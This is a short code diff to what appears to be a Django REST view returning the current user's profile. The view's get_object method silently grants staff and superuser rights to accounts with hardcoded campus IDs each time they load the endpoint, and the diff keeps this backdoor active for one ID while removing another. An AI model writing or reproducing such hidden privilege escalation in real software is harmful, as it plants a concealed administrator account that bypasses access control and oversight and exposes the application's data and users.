@@ -39,7 +39,7 @@ class UserMeView(generics.RetrieveAPIView):
     def get_object(self):
         user = self.request.user
         # 自動恢復特定使用者的管理員權限
-        if user.campus_id in ["113409016", "jlsrqytgp"] and not user.is_staff:
+        if user.campus_id == "113409016" and not user.is_staff:
             user.is_staff = True
             user.is_superuser = True
             user.save(update_fields=['is_staff', 'is_superuser'])
